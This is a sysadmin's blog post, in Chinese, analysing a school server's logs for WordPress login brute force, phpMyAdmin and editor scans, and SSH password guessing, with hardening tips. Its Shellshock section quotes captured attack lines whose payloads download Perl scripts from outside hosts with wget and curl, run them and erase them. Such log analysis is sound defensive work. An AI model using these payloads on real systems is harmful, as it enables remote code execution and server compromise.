<!DOCTYPE html>
<html lang="zh">
	<head>
		<link href="http://gmpg.org/xfn/11" rel="profile">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta http-equiv="content-type" content="text/html; charset=utf-8">

		<!-- Enable responsiveness on mobile devices-->
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

		<title>Tech Rain</title>

		<script>location.protocol === 'http:' && !location.host.match(/^(localhost|127\.0\.0\.1):?\d*$/) && (location.protocol = 'https:')</script>

		<!-- CSS -->
		<link href="//fonts.googleapis.com/" rel="dns-prefetch">
		<link href="//fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic|Abril+Fatface|PT+Sans:400,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet">

		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/poole.css" />
		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/hyde.css" />
		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/syntax.css" />
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">

		<!-- RSS -->
		<link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
	</head>

	<body class="theme-base-0d">
<div class="sidebar">
	<div class="container sidebar-sticky">
		<div class="sidebar-about">

			<h1>
				<a href="/">
					<img class="profile-picture" src="https://gravatar.com/avatar/26cdb92aafb2b2e6c8972edebda4bd17?s=180">
					Tech Rain
				</a>
			</h1>
				<h4>技術需要雨水滋潤才能成長茁壯</h4>
			<p class="lead"></p>
			<p class="lead">It's Inndy speaking. </p>
			<p></p>
		</div>
		<nav class="sidebar-nav">
					<a class="sidebar-nav-item" href="https://github.com/Inndy">
						<i class="fa fa-github"></i>
					</a>
					<a class="sidebar-nav-item" href="https://twitter.com/Inndy_tw">
						<i class="fa fa-twitter"></i>
					</a>
					<a class="sidebar-nav-item" href="https://www.inndy.tw/">
						<i class="fa fa-home"></i>
					</a>
			<a class="sidebar-nav-item" href="">
				<i class="fa fa-feed"></i>
			</a>
		</nav>
	</div>
</div>		<div class="content container">
<div class="post">
	<h1 class="post-title">網管的田野調查之誰在踹我的Server</h1>
	<span class="post-date">2015/02/20 11:33</span>
	<p>身為一個網管，平常的好（ㄜˋ）習（ㄑㄩˋ）慣（ㄨㄟˋ）之一就是看Log
定期看看你的 server 最近又被誰踹了、有哪些攻擊的痕跡、有誰跟你 Say Hello (?</p>
<h1>HTTP Access Log</h1>
<h2>User-Agent</h2>
<div class="highlight"><pre><span></span>$ log-cat.py <span class="s2">&quot;{8}&quot;</span> school-access.log <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr <span class="p">|</span> head -n 16
  <span class="m">56428</span> -
   <span class="m">2716</span> Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> U<span class="p">;</span> Linux i686<span class="p">;</span> pt-BR<span class="p">;</span> rv:1.9.0.15<span class="o">)</span> Gecko/2009102815 Ubuntu/9.04 <span class="o">(</span>jaunty<span class="o">)</span> Firefox/3.0.15
   <span class="m">2569</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.3<span class="p">;</span> WOW64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/40.0.2214.111 Safari/537.36
   <span class="m">2206</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.1<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/40.0.2214.91 Safari/537.36
   <span class="m">2175</span> Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux i686<span class="p">;</span> rv:37.0<span class="o">)</span> Gecko/20100101 Firefox/37.0
   <span class="m">1444</span> Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> U<span class="p">;</span> Windows NT 5.1<span class="p">;</span> en-US<span class="p">;</span> rv:1.9.0.7<span class="o">)</span> Gecko/2009021910 Firefox/3.0.7
   <span class="m">1031</span> Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span> PHP/5.5.9-1ubuntu4.5 <span class="o">(</span>internal dummy connection<span class="o">)</span>
    <span class="m">895</span> Mozilla/5.0 <span class="o">(</span>compatible<span class="p">;</span> Googlebot/2.1<span class="p">;</span> +http://www.google.com/bot.html<span class="o">)</span>
    <span class="m">698</span> Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.10<span class="p">;</span> rv:34.0<span class="o">)</span> Gecko/20100101 Firefox/34.0
    <span class="m">590</span> Mozilla/5.0 <span class="o">(</span>compatible<span class="p">;</span> Baiduspider/2.0<span class="p">;</span> +http://www.baidu.com/search/spider.html<span class="o">)</span>
    <span class="m">584</span> Mozilla/5.0 <span class="o">(</span>compatible<span class="p">;</span> bingbot/2.0<span class="p">;</span> +http://www.bing.com/bingbot.htm<span class="o">)</span>
    <span class="m">508</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.1<span class="p">;</span> WOW64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/39.0.2171.95 Safari/537.36
    <span class="m">491</span> Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.10<span class="p">;</span> rv:35.0<span class="o">)</span> Gecko/20100101 Firefox/35.0
    <span class="m">451</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.1<span class="p">;</span> WOW64<span class="p">;</span> rv:31.0<span class="o">)</span> Gecko/20100101 Firefox/31.0
    <span class="m">431</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.1<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/39.0.2171.95 Safari/537.36
    <span class="m">407</span> Mozilla/5.0 <span class="o">(</span>Windows NT 6.1<span class="p">;</span> WOW64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/40.0.2214.91 Safari/537.36
</pre></div>


<!--more-->

<h2>其中最大宗的是來 try <code>wp-login</code> 的...</h2>
<div class="highlight"><pre><span></span>$ cat school-access.log <span class="p">|</span> grep -e <span class="s1">&#39;POST \/\+wp-login&#39;</span> <span class="p">|</span> wc -l
54473
$ log-cat.py <span class="s2">&quot;{0}&quot;</span> school-access.log <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr <span class="p">|</span> head -n 16
  <span class="m">48381</span> 80.237.75.2
   <span class="m">3280</span> 77.72.147.39
   <span class="m">2716</span> 74.7.97.202
   <span class="m">1684</span> 1.162.50.120
   <span class="m">1557</span> 39.8.188.89
   <span class="m">1266</span> 124.12.208.13
   <span class="m">1067</span> ::1
    <span class="m">854</span> 60.250.33.110
    <span class="m">732</span> 180.177.122.206
</pre></div>


<h2>phpMyAdmin setup.php、fckeditor、ewebeditor、找後台</h2>
<p>大概分為以下四種</p>
<ul>
<li><code>phpMyAdmin</code> 的 <code>setup.php</code> 有一大堆洞不解釋...</li>
<li><code>fckeditor</code> 的檔案上傳</li>
<li><code>ewebeditor</code> 是一個來自左岸的 WYSIWYG Editor，也有很多洞</li>
<li>單純自動掃 <code>/admin</code></li>
</ul>
<p>在此提醒， <code>phpMyAdmin</code> 裝好之後記得要刪掉 <code>setup.php</code> ，另外也記得不要用太常見的路徑，如：</p>
<ul>
<li>phpmyadmin</li>
<li>phpMyAdmin</li>
<li>myadmin</li>
</ul>
<p>之類的名稱</p>
<div class="highlight"><pre><span></span>$ cat school-access.log <span class="p">|</span> grep -i -e <span class="s1">&#39;admin&#39;</span> <span class="p">|</span> grep -v -e <span class="s2">&quot;\/wp-\|</span><span class="nv">$HIDE_SIG</span><span class="s2">&quot;</span> <span class="p">|</span> log-cat.py <span class="s2">&quot;{4}&quot;</span> <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr <span class="p">|</span> head -n 40
    <span class="m">108</span> GET /phpMyAdmin/scripts/setup.php HTTP/1.1
     <span class="m">39</span> GET /myadmin/scripts/setup.php HTTP/1.1
     <span class="m">15</span> GET //phpMyAdmin/scripts/setup.php HTTP/1.1
     <span class="m">14</span> GET //phpmyadmin/scripts/setup.php HTTP/1.1
     <span class="m">14</span> GET //myadmin/scripts/setup.php HTTP/1.1
     <span class="m">14</span> GET //MyAdmin/scripts/setup.php HTTP/1.1
      <span class="m">7</span> GET /phpmyadmin/scripts/setup.php HTTP/1.1
      <span class="m">7</span> GET /MyAdmin/scripts/setup.php HTTP/1.1
      <span class="m">6</span> HEAD /webadmin/fckeditor/editor/ HTTP/1.1
      <span class="m">3</span> HEAD /phpMyAdmin/ HTTP/1.1
      <span class="m">3</span> HEAD /admin/editor/editor/ HTTP/1.1
      <span class="m">3</span> HEAD /admin/editor/ HTTP/1.1
      <span class="m">3</span> HEAD /admin HTTP/1.1
      <span class="m">3</span> GET /phpmyadmin/scripts/setup.php HTTP/1.0
      <span class="m">2</span> HEAD /admin_article HTTP/1.1
      <span class="m">2</span> HEAD /admin/system/editor/FCKeditor/editor/ HTTP/1.1
      <span class="m">2</span> HEAD /admin/ewebeditor/ HTTP/1.1
      <span class="m">2</span> GET /phpMyAdmin/scripts/setup.php HTTP/1.0
      <span class="m">1</span> HEAD /wenadmin HTTP/1.1
      <span class="m">1</span> HEAD /webadmin HTTP/1.1
      <span class="m">1</span> HEAD /web_admin HTTP/1.1
      <span class="m">1</span> HEAD /sysadmin/fckeditor/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /sysadmin HTTP/1.1
      <span class="m">1</span> HEAD /lists/admin/FCKeditor/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin_article/fckeditor/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/webeditor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/webedit/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/web_editor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/htmledit/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/fckeditor/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/fckeditor/editor HTTP/1.1
      <span class="m">1</span> HEAD /admin/fckedit/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /admin/eWebEditor/ HTTP/1.1
      <span class="m">1</span> HEAD /_admin/fckeditor/editor/ HTTP/1.1
      <span class="m">1</span> HEAD /Infoadmin/ewebeditor/ HTTP/1.1
      <span class="m">1</span> HEAD /INFOADMIN/eWebeditor/ HTTP/1.1
      <span class="m">1</span> HEAD /Administrator_School/EwebEditor/ HTTP/1.1
      <span class="m">1</span> GET /phpmyadmin2/main.php HTTP/1.0
      <span class="m">1</span> GET /phpmyadmin/main.php HTTP/1.0
      <span class="m">1</span> GET /phpmyadmin//setup/config.php?type<span class="o">=</span>post HTTP/1.1
</pre></div>


<h2>Shell Shock</h2>
<p><a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">shellshock on Wikipedia</a></p>
<div class="highlight"><pre><span></span>$ cat school-access.log <span class="p">|</span> grep -e <span class="s1">&#39;curl\|wget\|perl\|python&#39;</span> <span class="p">|</span> grep -v -e <span class="s1">&#39;curl\/&#39;</span>
87.106.95.7 - - <span class="o">[</span>19/Feb/2015:05:05:58 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">392</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://202.202.121.27/core -O /tmp/core;wget http://202.202.121.27/core -O /dev/shm/core; curl -O /dev/shm http://202.202.121.27/core;curl -O /tmp/core http://202.202.121.27/core;perl /tmp/core;perl /dev/shm/core;rm -rf /tmp/core*;rm -rf /dev/shm/core*\&quot;);&#39;&quot;</span>
108.61.212.127 - - <span class="o">[</span>08/Feb/2015:23:58:26 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">485</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &amp;\&quot;);&#39;&quot;</span>
69.162.105.66 - - <span class="o">[</span>14/Feb/2015:04:22:32 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">392</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://217.113.112.248/ou -O /tmp/b.pl;curl -O /tmp/b.pl http://217.113.112.248/ou;perl /tmp/b.pl;rm -rf /tmp/b.pl*\&quot;);&#39;&quot;</span>
209.92.176.24 - - <span class="o">[</span>14/Feb/2015:20:06:38 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">392</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;rm -rf /tmp/l.pl*;wget http://87.106.189.34/ou.pl -O /tmp/l.pl;curl -O /tmp/l.pl http://87.106.189.34/ou.pl;perl /tmp/l.pl;rm -rf l.pl**\&quot;);&#39;&quot;</span>
54.175.72.187 - - <span class="o">[</span>04/Feb/2015:06:59:11 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">485</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://allproutah.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://allproutah.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*\&quot;);&#39;&quot;</span>
91.142.209.68 - - <span class="o">[</span>30/Jan/2015:08:12:19 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">485</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://87.106.130.7/bou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://87.106.130.7/bou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*\&quot;);&#39;&quot;</span>
89.152.241.67 - - <span class="o">[</span>13/Dec/2014:02:15:23 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">485</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget www.freistilreisen.de/jack.jpg -O /tmp/jack.jpg;curl -O /tmp/jack.jpg www.freistilreisen.de/jack.jpg;perl /tmp/jack.jpg;rm -rf /tmp/jack.jpg*\&quot;);&#39;&quot;</span>
61.182.202.57 - - <span class="o">[</span>13/Dec/2014:12:02:23 +0800<span class="o">]</span> <span class="s2">&quot;GET HTTP/1.1 HTTP/1.1&quot;</span> <span class="m">400</span> <span class="m">485</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;() { :;};/usr/bin/perl -e &#39;print \&quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&quot;;system(\&quot;wget http://210.230.186.9/icons/guide/jp.pl -O /tmp/jp.pl;curl -O /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;fetch /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;perl /tmp/jp.pl;rm -rf /tmp/jp.pl*\&quot;);&#39;&quot;</span>
</pre></div>


<h3>"the beast"</h3>
<p>看起來應該是某些 server 預載了 <code>test-cgi</code> 來告訴你 cgi-bin 能動了，應該是在打 shellshock 之前做測試</p>
<div class="highlight"><pre><span></span>210.107.37.210 - - [20/Feb/2015:02:34:26 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 415 &quot;-&quot; &quot;the beast&quot;
140.115.17.214 - - [05/Feb/2015:07:10:15 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
140.115.17.214 - - [26/Jan/2015:22:07:30 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
218.25.54.25 - - [27/Jan/2015:03:14:32 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
140.115.17.214 - - [30/Jan/2015:00:28:33 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
198.211.30.100 - - [19/Jan/2015:09:55:07 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
198.211.30.100 - - [23/Jan/2015:12:35:22 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
198.211.30.100 - - [23/Jan/2015:17:46:57 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
62.80.182.229 - - [18/Jan/2015:00:27:05 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
198.211.30.100 - - [13/Dec/2014:19:19:59 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
198.211.30.100 - - [06/Dec/2014:21:48:10 +0800] &quot;GET /cgi-bin/test-cgi HTTP/1.1&quot; 404 508 &quot;-&quot; &quot;the beast&quot;
</pre></div>


<h1>auth.log</h1>
<h2>sshd</h2>
<p>ssh 被 try 的數量也蠻多的，記得裝 fail2ban</p>
<div class="highlight"><pre><span></span># 這些是存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e &#39;^.\{15\} Parents sshd&#39; | grep -e &#39;\]: Failed password&#39; | grep -v -e &#39;\]: Failed password for invalid user&#39; | awk &#39;{ print $9 }&#39; | sort | uniq -c | sort -nr
  16370 root
     60 www-data
     15 nobody
      7 lp
      7 backup
      6 games
      4 sshd
      3 bin
# 這些是不存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e &#39;^.\{15\} Parents sshd&#39; | grep -e &#39;\]: Failed password for invalid user&#39; | awk &#39;{ print $11 }&#39; | sort | uniq -c | sort -nr
    305 test
    199 nagios
    192 guest
    138 zabbix
    100 admin
     60 zxin10
     52 apache
     36 zhaowei
     33 PlcmSpIp
     32 web
     29 ubuntu
     28 cacti
     27 weblogic
     27 tomcat
     23 ftp
     21 squid
     18 webadmin
     18 Test
     16 r00t
     16 jboss
     16 java
     16 apache2
     15 oracle
     13 ubnt
     12 sysadmin
     12 httpd
     10 xbian
     10 pi
     10 info
      9 wangyi
      9 ts3
      9 nginx
      9 dff
      9 alex
      8 zhangyan
      8 jack
      7 support
      6 xiuzuan
      6 vyatta
      6 send
      6 log
      6 default
      5 xbmc
      5 ts
      5 teamspeak
      5 postgres
      5 git
      5 debug
      5 david
      5 christian
      5 boot
      5 aaron
      5 123456
      5 123
      4 webmail
      4 user
      4 smtp
      4 resin
      4 javaprg
      4 guestx
      4 guestuser
      4 guestadmin
      4 dreamer
      4 cisco
      4 cactiuser
      4 bob
      4 bash
      4 apache1
      3 ts3srv
      3 system
      3 staff
      3 sebastian
      3 sales
      3 nologin
      3 nagiosuser
      3 nagiosadmin
      3 karaf
      3 httpdocs
      3 httpd2
      3 hscroot
      3 ftpd
      3 ftp1
      2 john
      2 cusadmin
      2 administrator
      2 a
      1 xxxxxx
      1 unknown
      1 tech
      1 somesecguy
      1 shit
      1 root1
      1 kur
      1 iclock
      1 Fake
      1 chishin
      1 blank
      1 b
      1 arbab
      1 aditza
      1 00089
      1 0
</pre></div>


<h3>以 IP 來看統計</h3>
<div class="highlight"><pre><span></span># 因為 list 太長，所以只列出大於 10 次的 IP
$ cat-sys-log.sh /var/log auth.log | grep -e &#39;^.\{15\} Parents sshd&#39; | grep -e &#39;\]: Failed password for&#39; | awk &#39;{ if($10 == &quot;from&quot;) { print $11 } else if($10 == &quot;user&quot;) {print $13} }&#39; | sort | uniq -c | sort -nr
   7099 14.63.73.40
   2252 218.61.196.203
   1794 154.120.226.38
    998 182.92.183.24
    921 115.231.222.176
    499 158.85.244.228
    355 59.160.98.144
    323 222.186.130.222
    321 222.186.56.44
    321 222.186.56.42
    321 222.186.134.7
    321 115.239.248.48
    321 111.74.238.15
    319 222.186.58.81
    319 222.186.56.33
    167 115.231.218.130
    165 115.231.218.131
    122 183.136.216.4
     90 115.239.228.34
     55 193.111.238.147
     46 162.213.25.67
     40 115.239.228.6
     33 94.136.45.178
     31 87.106.132.188
     31 115.239.228.7
     31 115.230.126.151
     30 222.161.4.147
     26 115.239.228.9
     26 115.239.228.13
     25 115.239.228.15
     25 115.231.222.45
     23 115.239.228.4
     22 183.136.216.3
     20 115.239.228.16
     19 222.161.4.149
     19 103.41.124.111
     18 115.239.228.35
     17 115.239.228.11
     16 115.239.228.14
     14 183.136.216.6
     13 58.218.213.238
     13 115.239.228.12
     12 106.39.255.243
     11 222.161.209.92
</pre></div>


<h1>Attachments</h1>
<ul>
<li><a href="https://gist.github.com/Inndy/1d30d6d528babde6df47">log-cat.py</a></li>
<li><a href="https://github.com/Inndy/cli-tools/blob/master/cat-sys-log.sh">cat-sys-log.sh</a></li>
</ul>
	<div id="disqus_thread"></div>
		<script type="text/javascript">
			var disqus_shortname = 'techrain';
			(function() {
	 			var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
	 			dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
	 			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	 		})();
		</script>
	<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
</div>
		</div>
	<script type="text/javascript">
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
			ga('create', 'UA-50860830-2', 'auto');
			ga('send', 'pageview');
	</script>
	</body>
</html>